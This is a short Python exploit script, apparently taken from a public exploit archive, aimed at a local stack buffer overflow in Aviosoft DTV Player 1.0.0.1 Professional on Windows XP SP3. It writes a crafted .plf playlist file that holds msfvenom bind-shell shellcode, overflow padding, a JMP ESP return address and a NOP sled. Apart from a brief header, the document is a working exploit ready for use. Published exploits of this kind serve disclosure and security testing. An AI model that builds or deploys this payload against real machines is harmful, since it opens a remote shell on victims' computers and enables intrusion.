"""
Full title:	Aviosoft DTV Player 1.0.0.1 Professional Local Stack Buffer Overflow
Exploit Author:	Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:	http://www.aviosoft.com/
Version:	Aviosoft DTV Player 1.0.0.1 Professional
Tested on:	Windows XP SP3
Category:	local exploit
Platform:	windows
"""
#!/usr/bin/python
file=open("exploit.plf","wb")
#msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0a\x1a"
shellcode=("\xbe\xb2\x17\x21\x83\xd9\xc8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x53\x31\x77\x12\x83\xc7\x04\x03\xc5\x19\xc3\x76\xd5\xce\x81"
"\x79\x25\x0f\xe6\xf0\xc0\x3e\x26\x66\x81\x11\x96\xec\xc7\x9d"
"\x5d\xa0\xf3\x16\x13\x6d\xf4\x9f\x9e\x4b\x3b\x1f\xb2\xa8\x5a"
"\xa3\xc9\xfc\xbc\x9a\x01\xf1\xbd\xdb\x7c\xf8\xef\xb4\x0b\xaf"
"\x1f\xb0\x46\x6c\x94\x8a\x47\xf4\x49\x5a\x69\xd5\xdc\xd0\x30"
"\xf5\xdf\x35\x49\xbc\xc7\x5a\x74\x76\x7c\xa8\x02\x89\x54\xe0"
"\xeb\x26\x99\xcc\x19\x36\xde\xeb\xc1\x4d\x16\x08\x7f\x56\xed"
"\x72\x5b\xd3\xf5\xd5\x28\x43\xd1\xe4\xfd\x12\x92\xeb\x4a\x50"
"\xfc\xef\x4d\xb5\x77\x0b\xc5\x38\x57\x9d\x9d\x1e\x73\xc5\x46"
"\x3e\x22\xa3\x29\x3f\x34\x0c\x95\xe5\x3f\xa1\xc2\x97\x62\xae"
"\x27\x9a\x9c\x2e\x20\xad\xef\x1c\xef\x05\x67\x2d\x78\x80\x70"
"\x52\x53\x74\xee\xad\x5c\x85\x27\x6a\x08\xd5\x5f\x5b\x31\xbe"
"\x9f\x64\xe4\x2b\x97\xc3\x57\x4e\x5a\xb3\x07\xce\xf4\x5c\x42"
"\xc1\x2b\x7c\x6d\x0b\x44\x15\x90\xb4\x7b\xba\x1d\x52\x11\x52"
"\x48\xcc\x8d\x90\xaf\xc5\x2a\xea\x85\x7d\xdc\xa3\xcf\xba\xe3"
"\x33\xda\xec\x73\xb8\x09\x29\x62\xbf\x07\x19\xf3\x28\xdd\xc8"
"\xb6\xc9\xe2\xc0\x20\x69\x70\x8f\xb0\xe4\x69\x18\xe7\xa1\x5c"
"\x51\x6d\x5c\xc6\xcb\x93\x9d\x9e\x34\x17\x7a\x63\xba\x96\x0f"
"\xdf\x98\x88\xc9\xe0\xa4\xfc\x85\xb6\x72\xaa\x63\x61\x35\x04"
"\x3a\xde\x9f\xc0\xbb\x2c\x20\x96\xc3\x78\xd6\x76\x75\xd5\xaf"
"\x89\xba\xb1\x27\xf2\xa6\x21\xc7\x29\x63\x51\x82\x73\xc2\xfa"
"\x4b\xe6\x56\x67\x6c\xdd\x95\x9e\xef\xd7\x65\x65\xef\x92\x60"
"\x21\xb7\x4f\x19\x3a\x52\x6f\x8e\x3b\x77")
buffer="http://"
buffer+="A"*253
buffer+="\x53\x93\x42\x7E"#JMP ESP 7E429353
buffer+="\x90"*47
buffer+=shellcode
buffer+="\x90"*8
file.write(buffer)
file.close()